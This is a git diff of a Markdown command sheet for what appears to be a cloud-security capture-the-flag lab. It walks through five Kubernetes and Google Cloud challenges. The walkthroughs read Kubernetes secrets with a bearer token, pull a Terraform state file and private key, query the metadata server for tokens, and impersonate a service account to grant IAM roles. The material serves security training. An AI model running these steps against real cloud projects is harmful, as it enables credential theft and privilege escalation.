@@ -1,7 +1,9 @@
 # Commands
 
 <details>
-  <summary>Challenge 1</summary>
+  <summary>**Challenge 1**</summary>
+
+## Challenge 1
 
 set cluster IP
 #####
@@ -28,7 +30,7 @@ You can also query them by using the Kubernetes API:
     curl -k -H "Authorization:Bearer $TOKEN" https://$IP/api/v1/namespaces/default/pods
 
   <details>
-    <summary>Walkthrough</summary>
+    <summary>Walkthrough Challenge 1</summary>
   
   You can read Kubernetes secrets in the default namespace on the cluster. Which secrets might it hold?  
   #####
@@ -46,9 +48,12 @@ You can also query them by using the Kubernetes API:
 
 </details>
 
+#
 
 <details>
-  <summary>Challenge 2</summary>
+  <summary>**Challenge 2**</summary>
+
+## Challenge 2
 
 set project id
 #####
@@ -63,7 +68,7 @@ check service account
     gcloud auth list
 
   <details>
-    <summary>Walkthrough</summary>
+    <summary>Walkthrough Challenge 2</summary>
 
   List files on bucket
   #####
@@ -78,19 +83,84 @@ check service account
 
 </details>
 
+#
 
-# Challenge 3
+<details>
+  <summary>**Challenge 3**</summary>
+
+## Challenge 3
 
 read state file
 #####
     gsutil cat gs://file-uploads-$PROJECT_ID/default.tfstate
+
+  <details>
+    <summary>Walkthrough Challenge 3</summary>
     
-ssh into vm
-      ssh -i <private key file> alice@<compute instance IP> 
+  ssh into vm
+  #####
+    ssh -i <private key file> alice@<compute instance IP> 
 
-# Challenge 4
+  </details>
 
-# Challenge 5
+</details>
+
+#
+
+<details>
+  <summary>**Challenge 4**</summary>
+
+## Challenge 4
+
+show VM service account
+#####
+    gcloud auth list
+
+background: metadata server
+#####
+    curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/" -H "Metadata-Flavor: Google"
+
+demonstrate limited access scopes
+#####
+    gcloud compute instances list
+
+show access scopes from tokeninfo endpoint
+#####
+    curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)
+
+list storage buckets from VM
+#####
+    gsutil ls
+
+  <details>
+    <summary>Walkthrough Challenge 4</summary>
+
+  list function source code bucket
+  #####
+      gsutil ls gs://cloud-function-bucket-challenge4
+
+  read source code
+  #####
+      gsutil cat gs://cloud-function-bucket-challenge4/main.py
+
+  execute function invocation script
+  #####
+      ./invoke_monitoring_function.sh
+
+  extract command to get function token
+  #####
+    curl -s -X POST https://europe-west1-$PROJECT_ID.cloudfunctions.net/monitoring-function -H "Authorization: bearer $(gcloud auth print-identity-token)" -H "Content-Type: application/json" -d '{"metadata": "token"}'
+
+  </details>
+
+</details>
+
+#
+
+<details>
+  <summary>**Challenge 5**</summary>
+
+## Challenge 5
 
 set token as env var
 #####
@@ -112,9 +182,15 @@ Describe bindings on SA
 #####
     gcloud iam service-accounts get-iam-policy <terraform service account>
 
-## Walkthrough
-
-impersonate and set binding
-#####
+  <details>
+    <summary>Walkthrough Challenge 5</summary>
+  
+  impersonate and set binding
+  #####
     gcloud projects add-iam-policy-binding $PROJECT_ID --member=user:<your Google account> --role=roles/viewer --impersonate-service-account <terraform pipeline account>
+  
+  </details>
+
+</details>
+
 
